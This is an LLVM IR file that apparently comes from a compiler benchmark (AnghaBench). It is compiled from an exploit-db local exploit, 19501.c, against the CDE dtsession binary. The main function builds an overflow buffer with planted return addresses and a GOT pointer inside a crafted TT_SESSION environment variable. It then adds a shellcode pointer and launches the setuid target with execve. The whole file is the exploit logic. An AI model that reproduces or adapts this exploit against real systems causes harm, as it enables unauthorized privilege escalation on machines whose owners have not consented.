; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19501.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19501.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_LEN = common dso_local global i32 0, align 4
@got = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"/usr/dt/bin/dtsession\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@.str.2 = private unnamed_addr constant [23 x i8] c"forgot to set DISPLAY\0A\00", align 1
@SI_PLATFORM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [9 x i8] c"DISPLAY=\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"W=\00", align 1
@exploit = common dso_local global i8* null, align 8
@.str.5 = private unnamed_addr constant [45 x i8] c"TT_SESSION=01 18176 1289637086 1 0 1000 %s 4\00", align 1
@.str.6 = private unnamed_addr constant [17 x i8] c"LD_BIND_NOW=1   \00", align 1
@.str.7 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.8 = private unnamed_addr constant [2 x i8] c"\08\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [6 x i8*], align 16
  %3 = alloca [20 x i8*], align 16
  %4 = alloca [3072 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  %8 = alloca [512 x i8], align 16
  %9 = alloca [64 x i8], align 16
  %10 = alloca [256 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 31, i32* %11, align 4
  %13 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %14 = call i32 @memset(i8* %13, i8 signext 0, i32 3072)
  %15 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %16 = load i32, i32* @BUF_LEN, align 4
  %17 = call i32 @memset(i8* %15, i8 signext 97, i32 %16)
  %18 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %19 = load i32, i32* @BUF_LEN, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  %22 = bitcast i8* %21 to i64*
  store i64* %22, i64** %7, align 8
  %23 = load i64*, i64** %7, align 8
  %24 = getelementptr inbounds i64, i64* %23, i32 1
  store i64* %24, i64** %7, align 8
  store i64 3735931646, i64* %23, align 8
  %25 = load i64*, i64** %7, align 8
  %26 = getelementptr inbounds i64, i64* %25, i32 1
  store i64* %26, i64** %7, align 8
  store i64 3735931646, i64* %25, align 8
  %27 = load i64*, i64** %7, align 8
  %28 = getelementptr inbounds i64, i64* %27, i32 1
  store i64* %28, i64** %7, align 8
  store i64 3735931646, i64* %27, align 8
  %29 = load i64*, i64** %7, align 8
  %30 = getelementptr inbounds i64, i64* %29, i32 1
  store i64* %30, i64** %7, align 8
  store i64 3735931646, i64* %29, align 8
  %31 = load i64*, i64** %7, align 8
  %32 = getelementptr inbounds i64, i64* %31, i32 1
  store i64* %32, i64** %7, align 8
  store i64 3735931646, i64* %31, align 8
  %33 = load i64*, i64** %7, align 8
  %34 = getelementptr inbounds i64, i64* %33, i32 1
  store i64* %34, i64** %7, align 8
  store i64 3735931646, i64* %33, align 8
  %35 = load i64*, i64** %7, align 8
  %36 = getelementptr inbounds i64, i64* %35, i32 1
  store i64* %36, i64** %7, align 8
  store i64 3735931646, i64* %35, align 8
  %37 = load i64*, i64** %7, align 8
  %38 = getelementptr inbounds i64, i64* %37, i32 1
  store i64* %38, i64** %7, align 8
  store i64 3735931646, i64* %37, align 8
  %39 = load i64*, i64** %7, align 8
  %40 = getelementptr inbounds i64, i64* %39, i32 1
  store i64* %40, i64** %7, align 8
  store i64 3735931646, i64* %39, align 8
  %41 = load i64*, i64** %7, align 8
  %42 = getelementptr inbounds i64, i64* %41, i32 1
  store i64* %42, i64** %7, align 8
  store i64 4026531732, i64* %41, align 8
  %43 = load i64*, i64** %7, align 8
  %44 = getelementptr inbounds i64, i64* %43, i32 1
  store i64* %44, i64** %7, align 8
  store i64 3735931646, i64* %43, align 8
  %45 = load i32, i32* @got, align 4
  %46 = sext i32 %45 to i64
  %47 = load i64*, i64** %7, align 8
  %48 = getelementptr inbounds i64, i64* %47, i32 1
  store i64* %48, i64** %7, align 8
  store i64 %46, i64* %47, align 8
  %49 = load i64*, i64** %7, align 8
  %50 = getelementptr inbounds i64, i64* %49, i32 1
  store i64* %50, i64** %7, align 8
  store i64 3735931646, i64* %49, align 8
  %51 = load i64*, i64** %7, align 8
  %52 = getelementptr inbounds i64, i64* %51, i32 1
  store i64* %52, i64** %7, align 8
  store i64 3735931646, i64* %51, align 8
  %53 = load i64*, i64** %7, align 8
  %54 = getelementptr inbounds i64, i64* %53, i32 1
  store i64* %54, i64** %7, align 8
  store i64 4026531760, i64* %53, align 8
  %55 = load i64*, i64** %7, align 8
  %56 = getelementptr inbounds i64, i64* %55, i32 1
  store i64* %56, i64** %7, align 8
  store i64 4026531280, i64* %55, align 8
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %58 = bitcast i8* %57 to i64*
  store i64* %58, i64** %7, align 8
  %59 = load i64*, i64** %7, align 8
  %60 = getelementptr inbounds i64, i64* %59, i32 1
  store i64* %60, i64** %7, align 8
  store i64 3735928559, i64* %59, align 8
  %61 = load i64*, i64** %7, align 8
  %62 = getelementptr inbounds i64, i64* %61, i32 1
  store i64* %62, i64** %7, align 8
  store i64 3735928559, i64* %61, align 8
  %63 = load i64*, i64** %7, align 8
  %64 = getelementptr inbounds i64, i64* %63, i32 1
  store i64* %64, i64** %7, align 8
  store i64 3735928559, i64* %63, align 8
  %65 = load i64*, i64** %7, align 8
  %66 = getelementptr inbounds i64, i64* %65, i32 1
  store i64* %66, i64** %7, align 8
  store i64 3735928559, i64* %65, align 8
  %67 = load i64*, i64** %7, align 8
  %68 = getelementptr inbounds i64, i64* %67, i32 1
  store i64* %68, i64** %7, align 8
  store i64 3735928559, i64* %67, align 8
  %69 = load i64*, i64** %7, align 8
  %70 = getelementptr inbounds i64, i64* %69, i32 1
  store i64* %70, i64** %7, align 8
  store i64 4294967295, i64* %69, align 8
  %71 = load i64*, i64** %7, align 8
  %72 = getelementptr inbounds i64, i64* %71, i32 1
  store i64* %72, i64** %7, align 8
  store i64 3735928559, i64* %71, align 8
  %73 = load i64*, i64** %7, align 8
  %74 = getelementptr inbounds i64, i64* %73, i32 1
  store i64* %74, i64** %7, align 8
  store i64 0, i64* %73, align 8
  %75 = load i64*, i64** %7, align 8
  %76 = getelementptr inbounds i64, i64* %75, i32 1
  store i64* %76, i64** %7, align 8
  store i64 4026531764, i64* %75, align 8
  %77 = load i64*, i64** %7, align 8
  %78 = getelementptr inbounds i64, i64* %77, i32 1
  store i64* %78, i64** %7, align 8
  store i64 1, i64* %77, align 8
  %79 = load i64*, i64** %7, align 8
  %80 = getelementptr inbounds i64, i64* %79, i32 1
  store i64* %80, i64** %7, align 8
  store i64 4016947540, i64* %79, align 8
  %81 = load i64*, i64** %7, align 8
  %82 = getelementptr inbounds i64, i64* %81, i32 1
  store i64* %82, i64** %7, align 8
  store i64 4026531110, i64* %81, align 8
  %83 = load i64*, i64** %7, align 8
  %84 = getelementptr inbounds i64, i64* %83, i32 1
  store i64* %84, i64** %7, align 8
  store i64 0, i64* %83, align 8
  %85 = call i8* @strdup(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0))
  %86 = getelementptr inbounds [6 x i8*], [6 x i8*]* %2, i64 0, i64 0
  store i8* %85, i8** %86, align 16
  %87 = getelementptr inbounds [6 x i8*], [6 x i8*]* %2, i64 0, i64 1
  store i8* null, i8** %87, align 8
  %88 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %89 = icmp ne i8* %88, null
  br i1 %89, label %93, label %90

90:                                               ; preds = %0
  %91 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  %92 = call i32 @exit(i32 1) #3
  unreachable

93:                                               ; preds = %0
  %94 = load i32, i32* @SI_PLATFORM, align 4
  %95 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %96 = call i32 @sysinfo(i32 %94, i8* %95, i32 256)
  %97 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %98 = call i32 @strlen(i8* %97)
  %99 = sub nsw i32 20, %98
  %100 = getelementptr inbounds [6 x i8*], [6 x i8*]* %2, i64 0, i64 0
  %101 = load i8*, i8** %100, align 16
  %102 = call i32 @strlen(i8* %101)
  %103 = sub nsw i32 %99, %102
  %104 = load i32, i32* %11, align 4
  %105 = add nsw i32 %104, %103
  store i32 %105, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %106

106:                                              ; preds = %114, %93
  %107 = load i32, i32* %12, align 4
  %108 = load i32, i32* %11, align 4
  %109 = icmp slt i32 %107, %108
  br i1 %109, label %110, label %119

110:                                              ; preds = %106
  %111 = load i32, i32* %12, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 %112
  store i8 0, i8* %113, align 1
  br label %114

114:                                              ; preds = %110
  %115 = load i32, i32* %12, align 4
  %116 = add nsw i32 %115, 1
  store i32 %116, i32* %12, align 4
  %117 = sext i32 %115 to i64
  %118 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 %117
  store i8 67, i8* %118, align 1
  br label %106

119:                                              ; preds = %106
  %120 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %121 = call i32 @strlen(i8* %120)
  %122 = add nsw i32 8, %121
  %123 = add nsw i32 %122, 1
  %124 = call i8* @malloc(i32 %123)
  store i8* %124, i8** %6, align 8
  %125 = load i8*, i8** %6, align 8
  %126 = call i32 @strcpy(i8* %125, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0))
  %127 = load i8*, i8** %6, align 8
  %128 = getelementptr inbounds i8, i8* %127, i64 8
  %129 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  %130 = call i32 @strcat(i8* %128, i8* %129)
  %131 = load i8*, i8** %6, align 8
  %132 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 0
  store i8* %131, i8** %132, align 16
  %133 = call i8* @malloc(i32 60)
  %134 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 1
  store i8* %133, i8** %134, align 8
  %135 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 1
  %136 = load i8*, i8** %135, align 8
  %137 = call i32 @memset(i8* %136, i8 signext 0, i32 60)
  %138 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 1
  %139 = load i8*, i8** %138, align 8
  %140 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 0
  %141 = load i8*, i8** %140, align 16
  %142 = call i32 @strlen(i8* %141)
  %143 = sub nsw i32 60, %142
  %144 = call i32 @memset(i8* %139, i8 signext 97, i32 %143)
  %145 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 1
  %146 = load i8*, i8** %145, align 8
  %147 = call i32 @strncpy(i8* %146, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32 2)
  %148 = load i8*, i8** @exploit, align 8
  %149 = call i8* @strdup(i8* %148)
  %150 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 2
  store i8* %149, i8** %150, align 16
  %151 = call i8* @strdup(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.5, i64 0, i64 0))
  store i8* %151, i8** %5, align 8
  %152 = load i8*, i8** %5, align 8
  %153 = call i32 @strlen(i8* %152)
  %154 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %155 = call i32 @strlen(i8* %154)
  %156 = add nsw i32 %153, %155
  %157 = call i8* @malloc(i32 %156)
  %158 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 3
  store i8* %157, i8** %158, align 8
  %159 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 3
  %160 = load i8*, i8** %159, align 8
  %161 = load i8*, i8** %5, align 8
  %162 = getelementptr inbounds [3072 x i8], [3072 x i8]* %4, i64 0, i64 0
  %163 = call i32 @sprintf(i8* %160, i8* %161, i8* %162)
  %164 = call i8* @strdup(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.6, i64 0, i64 0))
  %165 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 4
  store i8* %164, i8** %165, align 16
  %166 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %167 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 5
  store i8* %166, i8** %167, align 8
  %168 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 6
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %168, align 16
  %169 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 7
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %169, align 8
  %170 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %170, align 16
  %171 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 32
  %172 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 9
  store i8* %171, i8** %172, align 8
  %173 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 10
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %173, align 16
  %174 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 11
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %174, align 8
  %175 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 39
  %176 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 12
  store i8* %175, i8** %176, align 16
  %177 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 13
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %177, align 8
  %178 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 14
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.7, i64 0, i64 0), i8** %178, align 16
  %179 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 15
  store i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.8, i64 0, i64 0), i8** %179, align 8
  %180 = getelementptr inbounds [64 x i8], [64 x i8]* %9, i64 0, i64 0
  %181 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 16
  store i8* %180, i8** %181, align 16
  %182 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 17
  store i8* null, i8** %182, align 8
  %183 = getelementptr inbounds [6 x i8*], [6 x i8*]* %2, i64 0, i64 0
  %184 = getelementptr inbounds [20 x i8*], [20 x i8*]* %3, i64 0, i64 0
  %185 = call i32 @execve(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8** %183, i8** %184)
  %186 = load i32, i32* %1, align 4
  ret i32 %186
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i8* @strdup(i8*) #1

declare dso_local i8* @getenv(i8*) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sysinfo(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @execve(i8*, i8**, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
